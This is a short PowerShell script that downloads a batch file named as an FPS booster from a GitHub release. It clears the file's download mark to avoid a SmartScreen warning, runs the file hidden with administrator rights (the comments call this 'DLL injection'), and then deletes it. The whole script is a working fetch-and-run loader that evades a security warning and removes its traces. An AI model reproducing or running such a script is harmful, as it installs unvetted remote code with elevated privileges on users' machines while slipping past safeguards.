# 1. Correct GitHub raw link
$exeUrl = "https://github.com/lokeshx2008/EXE/releases/download/BAT/-_Increase_FPS.bat"
$tempPath = "$env:TEMP\-_Increase_FPS.bat"

# 2. Download EXE from GitHub
Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing

# 3. Unblock (prevent SmartScreen warning)
Unblock-File -Path $tempPath

# 4. Run the EXE with elevated privileges (DLL injection), then wait
$proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb RunAs -PassThru
$proc.WaitForExit()

# 5. Delete the EXE after injection
Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue
